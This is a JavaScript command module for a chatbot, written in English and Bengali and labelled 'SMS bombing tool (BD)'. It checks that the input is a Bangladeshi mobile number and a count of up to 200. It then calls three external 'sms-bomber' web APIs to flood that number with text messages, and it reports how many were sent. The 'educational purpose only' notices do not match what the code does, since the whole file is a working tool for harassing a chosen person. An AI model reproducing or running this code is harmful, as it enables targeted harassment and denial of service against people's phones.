const axios = require("axios");

const SMS_BOMB_APIS = [
  (num, count) => `https://smsbd-bomber.vercel.app/api/bomb?num=${num}&count=${count}`,
  (num, count) => `https://bd-sms-bomb.vercel.app/bomb?number=${num}&count=${count}`,
  (num, count) => `https://sms-bomber-bd.vercel.app/api?num=${num}&c=${count}`,
];

module.exports = {
  config: {
    name: "smb",
    version: "3.0",
    author: "MD_SHAKIL",
    countDown: 30,
    role: 2,
    shortDescription: "SMS bombing tool (BD)",
    longDescription: "Send multiple SMS to a BD target number",
    category: "Tools",
    guide: {
      en: "{pn} <number> <count>\nExample: {pn} 01912345678 50"
    },
    aliases: ["smsbomb", "sbomb"]
  },

  onStart: async function ({ api, event, args, message }) {
    try {
      if (args.length < 2) {
        return message.reply(
          "📱 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐓𝐨𝐨𝐥\n\n" +
          "📝 Format: smb 01XXXXXXXXX 50\n" +
          "📊 Count range: 1–200\n" +
          "⚠️ Educational purpose only"
        );
      }

      const number = args[0];
      const count = parseInt(args[1]);

      if (!/^01[3-9]\d{8}$/.test(number)) {
        return message.reply("❌ বৈধ BD নাম্বার দাও (01XXXXXXXXX)");
      }

      if (isNaN(count) || count < 1 || count > 200) {
        return message.reply("❌ Count 1 থেকে 200 এর মধ্যে দাও।");
      }

      const proc = await message.reply(
        `📱 SMS Bombing শুরু হচ্ছে...\n📞 Target: ${number}\n🎯 Count: ${count}\n⏳ অপেক্ষা করো...`
      );

      let lastError = "";
      for (const apiBuilder of SMS_BOMB_APIS) {
        try {
          const url = apiBuilder(number, count);
          const res = await axios.get(url, { timeout: 30000 });
          const data = res.data;

          if (data && (data.success || data.status === "success" || data.sent || data.message)) {
            const sent = data.sent ?? data.successful ?? data.count ?? count;
            const msg =
              `╭━━━━━━━━━━━━━━━━━━━━━╮\n` +
              `      📱 𝐒𝐌𝐒 𝐑𝐄𝐏𝐎𝐑𝐓\n` +
              `╰━━━━━━━━━━━━━━━━━━━━━╯\n\n` +
              `📞 Target: ${number}\n` +
              `✅ Sent: ${sent}\n` +
              `📊 Requested: ${count}\n` +
              `⚠️ Educational purposes only`;
            return api.editMessage(msg, proc.messageID);
          }
          lastError = data?.message || data?.error || "API response invalid";
        } catch (e) {
          lastError = e.message;
          continue;
        }
      }

      api.editMessage(
        `❌ সব SMS API এই মুহূর্তে বন্ধ আছে।\n📞 Target: ${number}\n🎯 Count: ${count}\n⏰ পরে আবার try করো।`,
        proc.messageID
      );

    } catch (err) {
      console.error("SMB error:", err.message);
      message.reply("❌ Error: " + err.message);
    }
  }
};
